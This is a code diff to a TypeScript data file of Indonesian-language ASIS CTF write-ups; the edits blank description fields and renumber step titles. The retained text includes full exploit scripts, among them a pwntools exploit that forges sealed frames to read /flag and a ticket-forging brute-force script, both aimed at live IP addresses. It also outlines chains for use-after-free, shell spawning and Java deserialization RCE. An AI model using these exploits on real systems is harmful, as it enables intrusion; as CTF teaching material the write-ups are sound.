-    "description": "Bug ada di mekanisme `ROLLBACK`. Saat `SNAP`, program menyimpan metadata slot dan data payload. Saat `ROLLBACK`, program hanya mengembalikan metadata slot, free list, generation, dan epoch. Payload slot tidak dikembalikan. Akibatnya, payload baru dapat tetap tinggal di slot lama, tetapi metadata slot kembali ke tipe lama.\n\nPrimitive yang dipakai:\n\n- metadata confusion setelah rollback;\n- handle forging karena format handle hanya XOR dengan konstanta tetap `0xf4a77a8e77fb3a2c`;\n- leak payload job valid dengan membuat payload job berada di bawah metadata buffer;\n- recover secret integrity job dari signature job valid;\n- forge payload job bertipe shell dengan path `/bin/sh`;\n- jalankan forged job untuk mendapatkan shell;\n- baca flag dari memfd `as-flag` yang diwariskan ke shell.",
+    "description": "",
     "problemDescription": "Bug ada di mekanisme `ROLLBACK`. Saat `SNAP`, program menyimpan metadata slot dan data payload. Saat `ROLLBACK`, program hanya mengembalikan metadata slot, free list, generation, dan epoch. Payload slot tidak dikembalikan. Akibatnya, payload baru dapat tetap tinggal di slot lama, tetapi metadata slot kembali ke tipe lama.\n\nPrimitive yang dipakai:\n\n- metadata confusion setelah rollback;\n- handle forging karena format handle hanya XOR dengan konstanta tetap `0xf4a77a8e77fb3a2c`;\n- leak payload job valid dengan membuat payload job berada di bawah metadata buffer;\n- recover secret integrity job dari signature job valid;\n- forge payload job bertipe shell dengan path `/bin/sh`;\n- jalankan forged job untuk mendapatkan shell;\n- baca flag dari memfd `as-flag` yang diwariskan ke shell.",
     "tools": [
       "Python 3",
@@ -546,7 +546,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Pwn",
       "ASIS CTF"
     ],
-    "description": "Challenge ini berisi service `Dead Letter Queue` dengan tiga binary utama:\n\n```text\nrelay\nwarden\nworker\n```\n\n`relay` bertugas sebagai service TCP/protokol packet, `warden` sebagai validator, dan `worker` sebagai executor job.\n\nBug utamanya ada di mekanisme queue/ring buffer. Job yang sudah masuk antrean dispatch masih bisa di-`free`, lalu slot yang sama bisa dipakai ulang untuk job baru. Akibatnya, dispatch queue masih menyimpan referensi lama, tetapi isi slot sudah berubah menjadi payload attacker.\n\nExploit chain:\n\n```text\nfill queue pakai job benign valid\nfree salah satu job yang sudah queued\nallocate job baru di slot yang sama\nisi payload worker/VM\ndispatch stale queue entry\nleak worker seed\nhitung auth token /flag\ninstall token ke global secret worker\nread /flag\n```",
+    "description": "",
     "problemDescription": "Challenge ini berisi service `Dead Letter Queue` dengan tiga binary utama:\n\n```text\nrelay\nwarden\nworker\n```\n\n`relay` bertugas sebagai service TCP/protokol packet, `warden` sebagai validator, dan `worker` sebagai executor job.\n\nBug utamanya ada di mekanisme queue/ring buffer. Job yang sudah masuk antrean dispatch masih bisa di-`free`, lalu slot yang sama bisa dipakai ulang untuk job baru. Akibatnya, dispatch queue masih menyimpan referensi lama, tetapi isi slot sudah berubah menjadi payload attacker.\n\nExploit chain:\n\n```text\nfill queue pakai job benign valid\nfree salah satu job yang sudah queued\nallocate job baru di slot yang sama\nisi payload worker/VM\ndispatch stale queue entry\nleak worker seed\nhitung auth token /flag\ninstall token ke global secret worker\nread /flag\n```",
     "tools": [
       "Python 3",
@@ -708,7 +708,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Pwn",
       "ASIS CTF"
     ],
-    "description": "Challenge ini adalah VM service dengan object table berukuran tetap, bookmark 4 slot, dan mekanisme checkpoint/restore berbasis `SIGALRM`. Bug utamanya ada pada bookmark validation: bookmark hanya menyimpan selector dan 1 byte generation, jadi setelah sebuah slot di-recycle cukup banyak kali, bookmark lama bisa dipakai lagi untuk membaca dan menulis object baru pada selector yang sama.",
+    "description": "",
     "problemDescription": "Challenge ini adalah VM service dengan object table berukuran tetap, bookmark 4 slot, dan mekanisme checkpoint/restore berbasis `SIGALRM`. Bug utamanya ada pada bookmark validation: bookmark hanya menyimpan selector dan 1 byte generation, jadi setelah sebuah slot di-recycle cukup banyak kali, bookmark lama bisa dipakai lagi untuk membaca dan menulis object baru pada selector yang sama.",
     "tools": [
       "Python 3",
@@ -717,11 +717,11 @@ export const asisCtfWriteups: WriteUp[] = [
     "analysis": "---\ntitle: \"Signal Race\"\nctf: \"ASIS CTF\"\ndate: 2026-08-30\ncategory: pwn\ndifficulty: medium\npoints: 0\nflag_format: \"ASIS{...}\"\nauthor: \"nata\"\n---\n\n# Signal Race",
     "solution": [
       {
-        "title": "Step 1: Reuse a stale bookmark as arbitrary frame access",
+        "title": "Reuse a stale bookmark as arbitrary frame access",
         "content": "`NOTE <hex>` membuat object tipe note dan `BOOKMARK <selector>` menyimpan selector plus low byte generation. `DROP` menaikkan generation slot, tetapi `READ` dan `WRITE` hanya membandingkan low byte itu. Karena `NEW` dan `DROP` pada slot yang sama selalu menaikkan generation, kita bisa:\n\n1. Buat note, bookmark note tersebut, lalu drop.\n2. Spam `NEW` lalu `DROP` pada selector yang sama sampai low byte generation wrap kembali.\n3. Buat `NEW` sekali lagi sehingga bookmark lama sekarang valid terhadap sebuah frame.\n\nSetelah itu `READ 0 0 192` memberi dump penuh frame, dan `WRITE 0 0 <hex>` memberi write primitive ke frame tersebut."
       },
       {
-        "title": "Step 2: Forge a sealed `/flag` frame and trigger restore",
+        "title": "Forge a sealed `/flag` frame and trigger restore",
         "content": "Frame dilindungi dua seal 64-bit dan satu checksum 32-bit. Karena satu frame valid bisa dibaca penuh, key per-session untuk kedua seal bisa direcover langsung dari field frame yang ada. Setelah itu cukup ubah:\n\n- dword di offset `+0x04` menjadi `0x5352858a`\n- path di offset `+0x24` menjadi `\"/flag\\\\0\\\\0\\\\0\"`\n- seal di offset `+0x18`\n- seal di offset `+0x94`\n- checksum di offset `+0x20`\n\nLalu set timer, jalankan bytecode `92 <selector> 6f`, dan panggil `RESTORE`. Saat restore berhasil, service membaca path `/flag` dari frame palsu dan mencetak isi memfd flag.\n\n```python\n#!/usr/bin/env python3\nfrom pwn import remote\n\nHOST = \"91.107.187.160\"\nPORT = 18121\n\nMASK = (1 << 64) - 1\nC1 = 0xFF51AFD7ED558CCD\nC2 = 0xC4CEB9FE1A85EC53\nCONST = 0x803196D6A2A4C21C\nFNV_PRIME = 0x1000193\nFNV_OFFSET = 0xCA81E7E2\nINV1 = pow(C1, -1, 1 << 64)\nINV2 = pow(C2, -1, 1 << 64)\n\n\ndef u16(buf, off):\n    return int.from_bytes(buf[off:off + 2], \"little\")\n\n\ndef u32(buf, off):\n    return int.from_bytes(buf[off:off + 4], \"little\")\n\n\ndef u64(buf, off):\n    return int.from_bytes(buf[off:off + 8], \"little\")\n\n\ndef p32(val):\n    return val.to_bytes(4, \"little\")\n\n\ndef p64(val):\n    return val.to_bytes(8, \"little\")\n\n\ndef unxorshift_right(val, shift=33):\n    out = val\n    for _ in range(3):\n        out = val ^ (out >> shift)\n    return out & MASK\n\n\ndef fmix64(val):\n    val &= MASK\n    val ^= val >> 33\n    val = (val * C1) & MASK\n    val ^= val >> 33\n    val = (val * C2) & MASK\n    val ^= val >> 33\n    return val & MASK\n\n\ndef ifmix64(val):\n    val = unxorshift_right(val, 33)\n    val = (val * INV2) & MASK\n    val = unxorshift_right(val, 33)\n    val = (val * INV1) & MASK\n    val = unxorshift_right(val, 33)\n    return val\n\n\ndef inner_mix(path_qword, word8):\n    val = ((word8 << 48) ^ path_qword) & MASK\n    val ^= val >> 33\n    val = (val * C1) & MASK\n    val ^= val >> 33\n    val = (val * C2) & MASK\n    return val\n\n\ndef seal_a(key_a, frame):\n    inner = inner_mix(u64(frame, 0x24), u16(frame, 0x08))\n    mixed = u64(frame, 0x10)\n    mixed ^= (inner >> 33) ^ key_a\n    mixed ^= (u32(frame, 0x0C) << 17) & MASK\n    mixed ^= (u32(frame, 0x00) << 32) | u32(frame, 0x04)\n    mixed ^= inner ^ CONST\n    return fmix64(mixed)\n\n\ndef seal_b(key_b, frame):\n    mixed = ((u16(frame, 0x0A) << 48) | u16(frame, 0x08)) & MASK\n    mixed ^= key_b\n    mixed ^= u64(frame, 0x10)\n    mixed ^= u64(frame, 0x18)\n    mixed ^= (u32(frame, 0x04) << 19) & MASK\n    mixed ^= CONST\n    return fmix64(mixed)\n\n\ndef frame_checksum(frame):\n    data = bytearray(frame[:0x9C])\n    data[0x20:0x24] = b\"\\x00\" * 4\n    out = FNV_OFFSET\n    for byte in data:\n        out ^= byte\n        out = (out * FNV_PRIME) & 0xFFFFFFFF\n    return out\n\n\ndef derive_keys(frame):\n    inner = inner_mix(u64(frame, 0x24), u16(frame, 0x08))\n    key_a = ifmix64(u64(frame, 0x18))\n    key_a ^= u64(frame, 0x10)\n    key_a ^= inner >> 33\n    key_a ^= (u32(frame, 0x0C) << 17) & MASK\n    key_a ^= (u32(frame, 0x00) << 32) | u32(frame, 0x04)\n    key_a ^= inner ^ CONST\n\n    key_b = ifmix64(u64(frame, 0x94))\n    key_b ^= ((u16(frame, 0x0A) << 48) | u16(frame, 0x08)) & MASK\n    key_b ^= u64(frame, 0x10)\n    key_b ^= u64(frame, 0x18)\n    key_b ^= (u32(frame, 0x04) << 19) & MASK\n    key_b ^= CONST\n    return key_a & MASK, key_b & MASK\n\n\ndef recv_line(io):\n    return io.recvline().decode().strip()\n\n\nio = remote(HOST, PORT)\nprint(recv_line(io))\n\nio.sendline(b\"NOTE 41414141\")\nnote_resp = recv_line(io)\nprint(note_resp)\nselector = int(note_resp.split(\"note=\")[1].split()[0])\n\nio.sendline(f\"BOOKMARK {selector}\".encode())\nprint(recv_line(io))\n\nio.sendline(f\"DROP {selector}\".encode())\nprint(recv_line(io))\n\nfor _ in range(127):\n    io.sendline(b\"NEW\")\n    frame_resp = recv_line(io)\n    frame_sel = int(frame_resp.split(\"frame=\")[1].split()[0])\n    if frame_sel != selector:\n        raise RuntimeError(f\"unexpected selector reuse: {frame_sel} != {selector}\")\n    io.sendline(f\"DROP {frame_sel}\".encode())\n    recv_line(io)\n\nio.sendline(b\"NEW\")\nprint(recv_line(io))\n\nio.sendline(b\"READ 0 0 192\")\nframe = bytearray.fromhex(recv_line(io).split(\"=\", 1)[1])\n\nkey_a, key_b = derive_keys(frame)\n\nframe[0x04:0x08] = p32(0x5352858A)\nframe[0x24:0x2C] = b\"/flag\\x00\\x00\\x00\"\nframe[0x18:0x20] = p64(seal_a(key_a, frame))\nframe[0x94:0x9C] = p64(seal_b(key_b, frame))\nframe[0x20:0x24] = p32(frame_checksum(frame))\n\nio.sendline(f\"WRITE 0 0 {frame.hex()}\".encode())\nprint(recv_line(io))\n\nio.sendline(b\"TIMER 1000\")\nprint(recv_line(io))\n\nio.sendline(f\"RUN {selector} 92{selector:02x}6f\".encode())\nprint(recv_line(io))\n\nio.sendline(b\"RESTORE\")\nprint(recv_line(io))\n```\n\nContoh output:\n\n```text\nSR/1 release=588fce9879c77b15ca9d7383 chunk=192\nOK note=18 len=4\nOK bookmark=0\nOK dropped=18\nOK frame=18 gen=312\nOK wrote=192\nOK timer=1000\nOK run checkpoint=1\nOK ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}\n```"
       },
       {
@@ -745,7 +745,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Reverse",
       "ASIS CTF"
     ],
-    "description": "`qemu-asisarch` adalah emulator VM kecil yang menyamar seperti QEMU. ROM `challenge.rom` punya header `AARQ v2`, lalu body ROM dimuat ke memori VM 64 KB. Flag dibaca dari stdin, diproses sebagai 22 word little-endian, lalu hasil transformasinya dicek terhadap target di area data ROM.\n\nFlag valid:\n\n```\nASIS{M1ddL3_3nd14n_N1bbL35_M4k3_Q3MU_D122y!}\n```",
+    "description": "",
     "problemDescription": "`qemu-asisarch` adalah emulator VM kecil yang menyamar seperti QEMU. ROM `challenge.rom` punya header `AARQ v2`, lalu body ROM dimuat ke memori VM 64 KB. Flag dibaca dari stdin, diproses sebagai 22 word little-endian, lalu hasil transformasinya dicek terhadap target di area data ROM.\n\nFlag valid:\n\n```\nASIS{M1ddL3_3nd14n_N1bbL35_M4k3_Q3MU_D122y!}\n```",
     "tools": [
       "Python 3",
@@ -762,15 +762,15 @@ export const asisCtfWriteups: WriteUp[] = [
         "content": "Input diperlakukan sebagai 22 word little-endian:\n\n```\nw[0..21] = input[0..43] sebagai uint16 little-endian\n```\n\nAda 10 round transformasi. Setiap round berisi tiga tahap:"
       },
       {
-        "title": "1. S-box + XOR konstanta",
+        "title": "S-box + XOR konstanta",
         "content": "Untuk setiap word:\n\n```\nw[i] = sbox16(w[i]) ^ round_const[i]\n```\n\n`sbox16()` menerapkan S-box byte per byte ke high byte dan low byte."
       },
       {
-        "title": "2. Circular prefix-add",
+        "title": "Circular prefix-add",
         "content": "```python\nfor i in range(22):\n    prev = 21 if i == 0 else i - 1\n    w[i] = (w[i] + w[prev] + 0x5a5a) & 0xffff\n```\n\nKarena jalan in-place, `w[i-1]` untuk `i > 0` adalah nilai yang sudah diupdate."
       },
       {
-        "title": "3. Mix XOR linear",
+        "title": "Mix XOR linear",
         "content": "```python\ndef f(x):\n    return x ^ rol16(x, 5) ^ rol16(x, 11)\n\nfor i in range(22):\n    w[i] ^= f(w[(i + 1) % 22]) ^ rol16(f(w[(i + 2) % 22]), round_rotation)\n```\n\n`round_rotation` naik dari 1 sampai 10.\n\nChecker akhir mulai di `0x7874`. Program mengambil target dari area data `0x7cdb + offset`, tapi targetnya disimpan sebagai dua word yang di-XOR:\n\n```\ntarget[i] = u16(mem[0x7cdb + offset]) ^ u16(mem[0x7cdb + offset + 2])\n```\n\nLalu program menjumlahkan semua hasil XOR antara `w[i]` dan `target[i]`:\n\n```python\nacc = 0\nfor i in range(22):\n    acc = (acc + (w[i] ^ target[i])) & 0xffff\n\nvalid jika acc == 0\n```\n\nSolve script memakai target per-word yang natural, yaitu kondisi kuat `w[i] == target[i]` untuk semua `i`. Kondisi ini pasti membuat akumulator akhir nol dan menghasilkan flag yang meaningful."
       },
       {
@@ -807,7 +807,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Reverse",
       "ASIS CTF"
     ],
-    "description": "Challenge berisi binary `Atarude` dan file terenkripsi `flag.enc`. Binary menyediakan protokol interaktif dengan dua command utama: `e` untuk menghasilkan blok valid sepanjang 176 byte dan `s` untuk menerima blok valid. Setelah enam lane dianggap solved, program menghitung hash dari enam blok tersebut. Jika hash cocok dengan konstanta internal, program membuka dan mendekripsi `flag.enc`.\n\nBagian lucunya, dan tentu saja menyebalkan seperti semua desain CTF yang sehat secara moral, adalah `flag.enc` ternyata bisa didekripsi dari konstanta hash target di binary tanpa harus menyelesaikan semua enam lane secara penuh.",
+    "description": "",
     "problemDescription": "Challenge berisi binary `Atarude` dan file terenkripsi `flag.enc`. Binary menyediakan protokol interaktif dengan dua command utama: `e` untuk menghasilkan blok valid sepanjang 176 byte dan `s` untuk menerima blok valid. Setelah enam lane dianggap solved, program menghitung hash dari enam blok tersebut. Jika hash cocok dengan konstanta internal, program membuka dan mendekripsi `flag.enc`.\n\nBagian lucunya, dan tentu saja menyebalkan seperti semua desain CTF yang sehat secara moral, adalah `flag.enc` ternyata bisa didekripsi dari konstanta hash target di binary tanpa harus menyelesaikan semua enam lane secara penuh.",
     "tools": [
       "Python 3",
@@ -853,7 +853,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Reverse",
       "ASIS CTF"
     ],
-    "description": "Challenge ini berisi dua artefak utama:\n\n```text\nbeyond.elf\nscouting_report.c\n```\n\nSekilas `scouting_report.c` terlihat seperti source C obfuscated yang sangat besar. Namun setelah dianalisis, file tersebut ternyata menjadi carrier steganografi. Data disembunyikan melalui pola:\n\n1. jumlah leading spaces,\n2. jumlah karakter `w` pada expression,\n3. panjang comment.\n\nData tersembunyi tersebut membentuk container bertingkat yang berisi empat section. Section pertama adalah program VM, sedangkan tiga section sisanya berisi potongan flag dan patch terenkripsi untuk memodifikasi VM.\n\nFlag akhir:\n\n```text\nASIS{ioccc_g1v3s_c00l_1d34s}\n```\n\n---",
+    "description": "",
     "problemDescription": "Challenge ini berisi dua artefak utama:\n\n```text\nbeyond.elf\nscouting_report.c\n```\n\nSekilas `scouting_report.c` terlihat seperti source C obfuscated yang sangat besar. Namun setelah dianalisis, file tersebut ternyata menjadi carrier steganografi. Data disembunyikan melalui pola:\n\n1. jumlah leading spaces,\n2. jumlah karakter `w` pada expression,\n3. panjang comment.\n\nData tersembunyi tersebut membentuk container bertingkat yang berisi empat section. Section pertama adalah program VM, sedangkan tiga section sisanya berisi potongan flag dan patch terenkripsi untuk memodifikasi VM.\n\nFlag akhir:\n\n```text\nASIS{ioccc_g1v3s_c00l_1d34s}\n```\n\n---",
     "tools": [
       "Python 3",
@@ -924,23 +924,23 @@ export const asisCtfWriteups: WriteUp[] = [
         "content": "File challenge berisi ZIP dengan dua artefak penting:\n\n- `ham_fisted`: binary ELF 64-bit stripped.\n- `capture.wav`: audio PCM mono 12 kHz.\n\nBinary tersebut adalah encoder. Dari pengecekan argumen dan perilakunya, format jalannya seperti ini:\n\n```\n./ham_fisted <traffic.txt> <reserved.bin> <out.wav>\n```\n\nJadi `capture.wav` bukan rekaman radio biasa. File itu adalah hasil encoding traffic teks dan channel tambahan bernama `reserved`. Bagian yang perlu dibalik adalah modem custom-nya, bukan sekadar `strings`, karena tentu saja pembuat soal memilih jalan hidup yang menyebalkan."
       },
       {
-        "title": "2. Menemukan burst",
+        "title": "Menemukan burst",
         "content": "Burst pertama stabil di sekitar sample `13800`. Burst berikutnya bisa ditemukan dengan korelasi cyclic prefix. Karena setiap symbol punya prefix 64 sample yang mengulang akhir symbol, solver menghitung korelasi antara:\n\n```\nx[t : t+64]\n```\n\ndan:\n\n```\nx[t+256 : t+320]\n```\n\nNilai korelasi yang tinggi menandai kandidat awal symbol. Ini dipakai untuk mencari awal burst berikutnya tanpa perlu menebak dari waterfall."
       },
       {
-        "title": "3. Decode data carrier",
+        "title": "Decode data carrier",
         "content": "Carrier data adalah semua bin aktif selain reserved bin:\n\n```python\nFIXED_BINS = [51, 38, 25, 12]\nDATA_BINS = [b for b in range(12, 52) if b not in FIXED_BINS]\n```\n\nLayout bit per carrier tidak seragam. Fungsi `lens_for()` dari hasil reverse menentukan berapa bit yang dibawa tiap carrier pada burst tertentu. Setelah FFT, setiap nilai kompleks diklasifikasikan ke simbol terdekat.\n\nDaripada menulis ulang semua constellation secara manual, solver memakai binary asli sebagai oracle training lokal:\n\n1. Buat traffic acak.\n2. Jalankan `ham_fisted` untuk menghasilkan WAV training.\n3. Ambil FFT carrier data.\n4. Karena plaintext training diketahui, label simbol juga diketahui.\n5. Hitung centroid kompleks untuk setiap kemungkinan nilai simbol.\n\nMetode ini menghindari tebak-tebakan constellation. Binary encoder sudah diberikan, jadi pakai saja. Untuk apa pura-pura menderita kalau komputer bisa disuruh menderita duluan."
       },
       {
-        "title": "4. De-whitening dan CRC",
+        "title": "De-whitening dan CRC",
         "content": "Bit hasil klasifikasi masih melalui whitening LFSR. Whitening dibalik dengan fungsi yang sama karena operasinya XOR:\n\n```python\ndef xor_whitening(bits):\n    s = 0x1D74\n    out = []\n    for b in bits:\n        pr = (s >> 16) & 1\n        fb = ((s >> 11) ^ (s >> 16)) & 1\n        s = ((s << 1) | fb) & 0x1FFFF\n        out.append(b ^ pr)\n    return out\n```\n\nSetelah bit dibalik menjadi byte, panjang pesan dicoba. Kandidat pesan dianggap valid kalau CRC16 cocok:\n\n```\ncrc16(out[:L]) == ((out[L] << 8) | out[L + 1])\n```\n\nCRC16 memakai tabel dari binary, bukan varian standar yang ditebak dari internet. Menebak CRC itu hobi buruk, setara menyolder tanpa flux lalu menyalahkan semesta."
       },
       {
-        "title": "5. Payload yang benar",
+        "title": "Payload yang benar",
         "content": "Decoder menghasilkan beberapa email plaintext. Pada email pertama terdapat token:\n\n```\nASIS{y0u_r34d_th3_3m41l_c0ngr4tul4t10ns_1_gu3ss}\n```\n\nWalaupun isi email menyebut string tersebut sebagai decoy, token itulah yang diterima scoreboard untuk instance ini. Channel reserved juga bisa didecode dan menghasilkan payload lain yang tampak seperti flag, tetapi scoreboard menolaknya. Jadi solver final mengambil token `ASIS{...}` dari plaintext mail traffic, bukan dari reserved deflate stream."
       },
       {
-        "title": "6. Menjalankan solver",
+        "title": "Menjalankan solver",
         "content": "Letakkan `ham_fisted_solve.py` di folder yang sama dengan salah satu dari berikut:\n\n- folder hasil extract berisi `ham_fisted` dan `capture.wav`, atau\n- file `Ham_Fisted.zip`.\n\nLalu jalankan:\n\n```\npython3 ham_fisted_solve.py\n```\n\nOutput:\n\n```\nASIS{y0u_r34d_th3_3m41l_c0ngr4tul4t10ns_1_gu3ss}\n```"
       },
       {
@@ -969,7 +969,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Reverse",
       "ASIS CTF"
     ],
-    "description": "Binary menerima flag dengan format `ASIS{...}`. Bagian dalam flag panjangnya 28 byte dan diproses per 4 byte. Setiap 4 byte menghasilkan satu nilai `uint32`, lalu 7 nilai itu dicek memakai relasi berantai, hash kecil, dan beberapa validasi state.\n\nFlag valid yang didapat:\n\n```\nASIS{haaducrcplmekhylrozcxyxzuizs}\n```",
+    "description": "",
     "problemDescription": "Binary menerima flag dengan format `ASIS{...}`. Bagian dalam flag panjangnya 28 byte dan diproses per 4 byte. Setiap 4 byte menghasilkan satu nilai `uint32`, lalu 7 nilai itu dicek memakai relasi berantai, hash kecil, dan beberapa validasi state.\n\nFlag valid yang didapat:\n\n```\nASIS{haaducrcplmekhylrozcxyxzuizs}\n```",
     "tools": [
       "Python 3",
@@ -1019,7 +1019,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Reverse",
       "ASIS CTF"
     ],
-    "description": "File `lesh.hex` berisi shellcode x86 Windows dalam bentuk hex ASCII. String flag tidak disimpan langsung sebagai teks. Shellcode membentuk string di stack lewat beberapa `push imm32`, lalu mendekode tiap dword dengan `xor dword ptr [esp+0xc], ecx`.\n\nString pertama yang muncul adalah decoy:\n\n```\nASIS{BorrowwwYourEyess!!!!!}\n```\n\nString itu memang terlihat seperti flag, tapi masih diperbaiki oleh beberapa instruksi byte-level setelah proses decode awal. Dua percobaan sebelumnya gagal karena berhenti di string sementara. Klasik sekali: programnya bilang \"catch the flag\", lalu menaruh ikan plastik di depan muka kita.",
+    "description": "",
     "problemDescription": "File `lesh.hex` berisi shellcode x86 Windows dalam bentuk hex ASCII. String flag tidak disimpan langsung sebagai teks. Shellcode membentuk string di stack lewat beberapa `push imm32`, lalu mendekode tiap dword dengan `xor dword ptr [esp+0xc], ecx`.\n\nString pertama yang muncul adalah decoy:\n\n```\nASIS{BorrowwwYourEyess!!!!!}\n```\n\nString itu memang terlihat seperti flag, tapi masih diperbaiki oleh beberapa instruksi byte-level setelah proses decode awal. Dua percobaan sebelumnya gagal karena berhenti di string sementara. Klasik sekali: programnya bilang \"catch the flag\", lalu menaruh ikan plastik di depan muka kita.",
     "tools": [
       "Python 3",
@@ -1069,7 +1069,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Web",
       "ASIS CTF"
     ],
-    "description": "Flag berada di dua file berlabel acak pada `/opt/citadel/vault` dan\n`/opt/citadel/gate`. Gateway TCP di port 4000 menerima frame Tomcat Tribes,\ngagal memeriksa seal AES lalu meneruskan objek Java ke session keeper. Objek\nCommons Collections menghasilkan RCE sebagai user `citadel`.",
+    "description": "",
     "problemDescription": "Flag berada di dua file berlabel acak pada `/opt/citadel/vault` dan\n`/opt/citadel/gate`. Gateway TCP di port 4000 menerima frame Tomcat Tribes,\ngagal memeriksa seal AES lalu meneruskan objek Java ke session keeper. Objek\nCommons Collections menghasilkan RCE sebagai user `citadel`.",
     "tools": [
       "Python 3",
@@ -1144,7 +1144,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Web",
       "ASIS CTF"
     ],
-    "description": "Challenge ini kelihatannya mengarah ke race condition di endpoint `/lottery`, tapi payout maksimumnya tidak pernah cukup untuk mencapai wallet `31337`. Jalur yang benar adalah memanfaatkan source code yang dibocorkan di `/`, memahami bentuk tiket `Hashids`, lalu brute-force inti golden ticket dari hash SHA-512 yang dibocorkan oleh `/flag`.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatannya mengarah ke race condition di endpoint `/lottery`, tapi payout maksimumnya tidak pernah cukup untuk mencapai wallet `31337`. Jalur yang benar adalah memanfaatkan source code yang dibocorkan di `/`, memahami bentuk tiket `Hashids`, lalu brute-force inti golden ticket dari hash SHA-512 yang dibocorkan oleh `/flag`.",
     "tools": [
       "Python 3",
@@ -1153,11 +1153,11 @@ export const asisCtfWriteups: WriteUp[] = [
     "analysis": "---\ntitle: \"The Lottery Race\"\nctf: \"ASIS CTF\"\ndate: 2026-08-30\ncategory: web\ndifficulty: medium\npoints: 0\nflag_format: \"ASIS{...}\"\nauthor: \"nata\"\n---\n\n# The Lottery Race",
     "solution": [
       {
-        "title": "Step 1: Baca source dan buang false lead race",
+        "title": "Baca source dan buang false lead race",
         "content": "Route `/` mengembalikan source code Flask. Dari sana terlihat:\n\n- `/login` memberi cookie `ticket = generate_ticket(1337)`.\n- `/lottery` memang bisa dirace, tapi total prize dibatasi `MAX_RACE = 5` dan `PRIZE_MAX = 9`.\n- `/buy` butuh wallet `31337`, jadi race tidak akan pernah cukup.\n- `/flag` tidak butuh session valid; endpoint ini hanya membandingkan cookie `ticket` dengan `generate_ticket(31337)`, dan jika gagal dia membocorkan `sha512(Golden Ticket)`.\n\nObservasi pentingnya: `generate_ticket()` bersifat deterministik terhadap nilai wallet. Ticket untuk `1337` selalu sama, dan karena implementasinya cocok dengan `Hashids`, ticket `1337` dan `31337` punya padding yang sama karena:\n\n```text\n1337 % 100 == 31337 % 100 == 37\n```\n\nPada `Hashids`, nilai ini menentukan `lottery` character yang mengendalikan shuffle internal untuk satu angka. Artinya sebagian besar ticket `31337` identik dengan ticket `1337`; yang berubah hanya inti pendek di tengah."
       },
       {
-        "title": "Step 2: Brute-force inti golden ticket",
+        "title": "Brute-force inti golden ticket",
         "content": "Setelah membandingkan struktur ticket `1337` dengan perilaku `Hashids`, bentuk ticket `31337` bisa ditulis sebagai:\n\n```text\nticket_31337 = ticket_1337[1:53] + core6 + ticket_1337[58:]\n```\n\nJadi kita tidak perlu recover salt penuh. Cukup ambil hash SHA-512 dari `/flag`, lalu brute-force `core6`. Ruang carinya kecil: `44^3 * 4 = 340736` kandidat.\n\nScript final:\n\n```python\n#!/usr/bin/env python3\n\nimport hashlib\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nBASE_TICKET_1337 = (\n    \"gonKBqlDdPr3Kg29oXObMZjNEm18pWG1lxAM9GBLJyK43DroYXZ27egV10dVpvqb\"\n    \"Namw6OEjRPg8kznWv6zJnq7BlA4wkRaVyDYLxdNG6rVMy7\"\n)\nALPHABET = \"12346789ABDEGJKLMNOPRVWXYZabdgjklmnopqrvwxyz\"\nGUARDS = \"05Qe\"\n\n\ndef fetch_target_hash(session: requests.Session, base_url: str) -> str:\n    resp = session.get(f\"{base_url}/flag\", timeout=10)\n    if resp.status_code not in (200, 403):\n        resp.raise_for_status()\n    match = re.search(r\"sha512\\\\(Golden Ticket\\\\) = ([0-9a-f]{128})\", resp.text)\n    if not match:\n        raise RuntimeError(\"golden ticket hash not found\")\n    return match.group(1)\n\n\ndef build_golden_ticket(target_hash: str) -> str:\n    prefix = BASE_TICKET_1337[1:53]\n    suffix = BASE_TICKET_1337[58:]\n    for d1 in ALPHABET:\n        for d2 in ALPHABET:\n            for d3 in ALPHABET:\n                for g2 in GUARDS:\n                    ticket = prefix + \"eg\" + d1 + d2 + d3 + g2 + suffix\n                    if hashlib.sha512(ticket.encode()).hexdigest() == target_hash:\n                        return ticket\n    raise RuntimeError(\"no matching ticket found\")\n\n\ndef main() -> int:\n    base_url = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(\n        \"TARGET_URL\", \"http://91.107.150.87:33617\"\n    )\n    session = requests.Session()\n    target_hash = fetch_target_hash(session, base_url)\n    ticket = build_golden_ticket(target_hash)\n    resp = session.get(f\"{base_url}/flag\", cookies={\"ticket\": ticket}, timeout=10)\n    resp.raise_for_status()\n    print(resp.text)\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nScript ini menghasilkan golden ticket:\n\n```text\nonKBqlDdPr3Kg29oXObMZjNEm18pWG1lxAM9GBLJyK43DroYXZ27egnZM0dVpvqbNamw6OEjRPg8kznWv6zJnq7BlA4wkRaVyDYLxdNG6rVMy7\n```\n\nLalu request ke `/flag` mengembalikan:\n\n```json\n{\"flag\":\"ASIS{h4shId5_!5_n0T_5aF3!!!!!}\",\"ok\":true}\n```"
       },
       {
